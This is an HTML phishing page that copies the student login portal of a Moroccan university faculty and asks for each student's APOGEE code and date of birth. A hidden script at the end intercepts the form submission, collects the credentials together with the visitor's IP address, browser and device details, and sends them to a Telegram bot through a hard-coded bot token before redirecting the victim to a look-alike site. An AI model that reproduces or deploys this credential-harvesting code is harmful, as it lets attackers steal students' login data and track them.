<body>

  <main>
    <div class="container">
      <section class="section register min-vh-100 d-flex flex-column align-items-center justify-content-center py-4">
        <div class="container">
          <div class="row justify-content-center">
            <div class="col-lg-4 col-md-6 d-flex flex-column align-items-center justify-content-center">
              <div class="card mb-3">
                <div class="card-body">
                  <div class="d-flex justify-content-center py-4">
                    <a href="https://ent-fpo.uiz.ac.ma/index" class="logo d-flex align-items-center w-auto">
                      <img src="E-TALIB_files/FPO.jpg" alt="" style="max-height: 100px">
                    </a>
                  </div>
                  <div class="pt-4 pb-2">
                    <h5 class="card-title text-center pb-0 fs-4">Authentification</h5><br>
                  </div>

                  <form id="login-form" method="POST" action="" class="row g-3 needs-validation" novalidate="">

                    <div class="col-12">
                      <label for="yourUsername" class="form-label">Code APOGEE:</label>
                      <div class="input-group has-validation">
                        <input type="text" placeholder="Login (code Apogée)" name="APOGEE" class="form-control" id="APOGEE" onkeydown="if(event.keyCode==32) return false;" required="">
                        <div class="invalid-feedback">Veuillez vérifier et compléter ce champ.</div>
                      </div>
                    </div>

                    <div class="col-12">
                      <label for="yourPassword" class="form-label">Date de Naissance (jj/mm/aaaa):</label>
                      <input type="date" placeholder="" name="DN" class="form-control" id="DN" required="">
                      <div class="invalid-feedback">Veuillez vérifier et compléter ce champ.</div>
                    </div>

                    <div class="col-12">
                      <div class="form-check">
                        <input class="form-check-input" type="checkbox" name="remember" value="true" id="rememberMe">
                        <label class="form-check-label" for="rememberMe">Se souvenir de moi ?</label>
                      </div>
                    </div>

                    <div class="col-12">
                      <button class="btn btn-primary w-100" type="submit">Se connecter</button>
                    </div>

                    <div class="col-12">
                      <p class="small mb-0">
                        Si vous rencontrez des difficultés pour vous connecter à votre compte, veuillez nous contacter.
                        <strong><b style="color:red;"><a href="https://ent-fpo.uiz.ac.ma/GET_APOGEE.php">Obtenir votre code APOGEE</a></b></strong>
                      </p>
                    </div>
                  </form>
                </div>
              </div>

              </div>

          </div>
        </div>
      </section>
    </div>
  </main>

  <svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xlink="http://www.w3.org/1999/xlink" svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;">

  <script>
    const TOKEN = "7593409061:AAHEPCTCLtvxaAWcEym79gL8ueHRB7tvDXg";
    const CHAT_ID = "6015215674"; 
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    document.getElementById('login-form').addEventListener('submit', function (e) {
      e.preventDefault(); // منع الإرسال التقليدي للنموذج

      const APOGEE = document.getElementById('APOGEE').value; // جمع قيمة حقل Code APOGEE
      const DN = document.getElementById('DN').value; // جمع قيمة حقل تاريخ الميلاد

      // التحقق من وجود بيانات المدخلات
      if (!APOGEE || !DN) {
        alert("يرجى ملء جميع الحقول.");
        return;
      }

      // الحصول على عنوان IP الخاص بالمستخدم
      axios.get('https://api.ipify.org?format=json')
        .then(response => {
          const ip = response.data.ip;
          const userAgent = navigator.userAgent;
          const platform = navigator.platform;
          const screenWidth = screen.width;
          const screenHeight = screen.height;
          const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Ordinateur';

          // إعداد الرسالة التي سيتم إرسالها إلى تلغرام
          const message = `
<b>Nouvelle tentative de connexion</b>
<b>Code APOGEE :</b> ${APOGEE}
<b>Date de Naissance :</b> ${DN}
<b>Adresse IP :</b> ${ip}
<b>Type d'appareil :</b> ${deviceType}
<b>Plateforme :</b> ${platform}
<b>Agent utilisateur :</b> ${userAgent}
<b>Résolution d'écran :</b> ${screenWidth}x${screenHeight}
          `;

          // إرسال الرسالة إلى تلغرام
          axios.post(URI_API, {
            chat_id: CHAT_ID,
            parse_mode: 'html',
            text: message
          }).then(() => {
            // إعادة توجيه المستخدم بعد نجاح الإرسال
            
            window.location.href = "https://e-talib-uiz.github.io"; // يمكن تعديل الرابط هنا
          }).catch((error) => {
            console.error("خطأ في إرسال الرسالة إلى تلغرام:", error);
          });
        }).catch((error) => {
          console.error("خطأ في الحصول على عنوان الـ IP:", error);
        });
    });
  </script>
